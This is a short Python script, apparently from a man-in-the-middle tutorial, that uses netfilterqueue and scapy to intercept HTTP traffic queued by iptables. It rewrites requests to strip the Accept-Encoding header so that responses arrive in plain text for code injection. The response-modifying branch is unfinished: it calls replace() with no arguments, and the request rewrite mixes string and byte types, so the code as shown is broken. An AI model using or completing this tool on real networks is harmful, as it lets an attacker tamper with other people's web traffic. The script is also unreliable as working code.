#!/usr/bin/env python3
import netfilterqueue
import re
from scapy.layers.inet import IP
from scapy.layers.http import Raw, TCP


def set_load(packet, load):
    packet[Raw].load = load
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = IP(packet.get_payload())  # Transform raw packet to scapy.
    if scapy_packet.haslayer(Raw):  # Checking if a packet has a Raw response on the TCP layer.
        if scapy_packet[TCP].dport == 80:  # dport is incoming
            print("HTTP Request")
            # Replacing encoding to see raw html.
            mod_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[Raw].load)
            new_packet = set_load(scapy_packet, mod_load)
            packet.set_payload(bytes(new_packet))
        elif scapy_packet[TCP].sport == 80:  # sport is outgoing
            print("HTTP Response")
            modified_load = scapy_packet[Raw].load.replace()

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)  # Connect our queue to the iptables command queue_num.
queue.run()
